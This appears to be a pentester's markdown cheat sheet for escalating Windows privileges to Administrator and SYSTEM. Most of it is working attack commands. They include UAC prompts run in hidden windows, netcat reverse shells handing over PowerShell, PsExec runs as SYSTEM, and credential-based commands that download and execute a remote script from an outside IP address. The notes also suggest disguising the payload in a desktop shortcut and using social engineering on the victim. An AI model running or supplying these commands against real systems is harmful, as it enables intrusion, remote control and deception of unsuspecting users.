## Becoming `BUILTIN\Administrator`

## Method 1 : ask UAC to the victim
> warnings:
> - run the program in another powershell window instance
> - the OS will ask the victim permissions with the UAC popup
> 	- need the victim to accept

Tips : if you set the payload to a revshell and embed this code in a desktop shortcut, when the victim will double click on the desktop shortcut, it'll run our payload and it will seems fluent for him

Open a new graphical window as admin :
```powershell
Start-Process <command, ex : "powershell"> -Verb runas
```
Execute command as admin in a hidden window
```powershell
Start-Process <command, ex : "powershell"> -Verb runas -WindowStyle Hidden
# Example
# Note the arguments are passed with -ArgumentList
Start-Process "curl" -Verb runas -WindowStyle Hidden -ArgumentList "http://192.168.0.17:8000/"
```
Same as above, but executing a script
```powershell
Start-Process -FilePath "<script path>" -Verb RunAs -WindowStyle Hidden
```

### `SUDO Asking for UAC` but not poping any additional window (ex: no cmd promt or powershell)

> Warning :
>  - The victim will be alerted by the UAC panel
>  - Before using this method you have to disable the firewall / or allow the specific listener port

Download nc.exe on windows: https://github.com/int0x33/nc.exe/
Then with two powershell sessions:
  - with the first list with netcat `.\nc.exe -lvp 9001`
  - with the second powershell, execute:
```powershell
Start-Process "powershell" -Verb runas -WindowStyle Hidden -ArgumentList "C:\Users\talion\Desktop\Tools\All\netcat\nc.exe 127.0.0.1 9001 -e powershell"
```

The victim will be alerted by the UAC panel and have to accept the execution for the attack to work (you have to do some social engeenering)

Then, you will get a revshell via localhost with full admin privileges !


## Method 2 : switch user via credentials
> infos:
> - similar to `su` on linux 
> - stealthier than method 1
> - but longer commands
> - need to know the creds

##### TLDR
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<HOST>\<USERNAME>', $SecPassword)
Start-Process -Credential ($Cred) -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"
```

> From [HackTricks : powershell for pentester page](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#sudo)

```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred) -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred

#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```


Other resources:
- https://asfiyashaikh.medium.com/windows-privilege-escalation-using-sudo-su-ae5573feccd9



## Becoming `NT AUTHORITY\SYSTEM`

> This assume that you have `BUILTIN\Administrator` or `admin group` access

> # [What is the Difference Between Windows Administrator and Windows System Users](https://stackoverflow.com/questions/14507439/what-is-the-difference-between-windows-administrator-and-windows-system-users)

### Using PsExec.exe from Windows Sysinternals
```powershell
d:\tools\psexec.exe -sid <program path>
```

#### Example using revershell on localhost

> Warning: a cmd window will popup for half a second but it can still alert the victim

Download nc.exe on windows: https://github.com/int0x33/nc.exe/
Then with two powershell sessions:
  - with the first list with netcat `.\nc.exe -lvp 9002`
  - with the second powershell, execute:
```powershell
.\psexec.exe -sid powershell -WindowStyle Hidden "C:\Users\talion\Desktop\Tools\All\netcat\nc.exe 127.0.0.1 9002 -e powershell"
```

Then, you will get a revshell via localhost with `NT AUTHORITY\SYSTEM` account !
